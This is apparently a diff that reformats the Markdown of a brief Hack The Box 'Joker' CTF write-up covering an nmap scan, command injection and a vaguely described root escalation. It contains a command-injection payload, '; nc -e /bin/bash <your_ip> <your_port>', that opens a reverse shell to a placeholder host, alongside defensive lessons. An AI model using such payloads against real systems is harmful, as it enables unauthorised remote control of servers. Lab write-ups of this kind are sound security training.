@@ -1,33 +1,27 @@
-#Hack The Box: "Joker" Challenge Writeup
-#Objective:
+# Hack The Box: "Joker" Challenge Writeup
 
+## Objective:
 Exploit a remote code execution (RCE) vulnerability in a web application and escalate privileges to root.
 
-#Step 1: Reconnaissance
+## Step 1: Reconnaissance
+- Scanned the target system with nmap:
+    ```bash
+    nmap -A -T4 <target_ip>
+    ```
+- Found a web application running on port 8080.
 
--Scanned the target system with nmap:
+## Step 2: Exploiting RCE
+- Browsed the web application and found a command injection vulnerability in a form input field.
+- Injected a reverse shell payload:
+    ```bash
+    ; nc -e /bin/bash <your_ip> <your_port>
+    ```
+- Gained a reverse shell on the server.
 
-    'bash
-    'nmap -A -T4 <target_ip>
+## Step 3: Privilege Escalation
+- Enumerated the system using linpeas and found a vulnerable service running with root privileges.
+- Exploited the service to escalate privileges to root.
 
--Found a web application running on port 8080.
-
-#Step 2: Exploiting RCE
-
--Browsed the web application and found a command injection vulnerability in a form input field.
--Injected a reverse shell payload:
-
-    'bash
-  ' ; nc -e /bin/bash <your_ip> <your_port>
-
--Gained a reverse shell on the server.
-
-#Step 3: Privilege Escalation
-
--Enumerated the system using linpeas and found a vulnerable service running with root privileges.
--Exploited the service to escalate privileges to root.
-
-#Lessons Learned:
-
--Command injection vulnerabilities can give attackers direct control over a server.
--Running services as root increases the risk of privilege escalation if vulnerabilities are present.
+## Lessons Learned:
+- Command injection vulnerabilities can give attackers direct control over a server.
+- Running services as root increases the risk of privilege escalation if vulnerabilities are present.
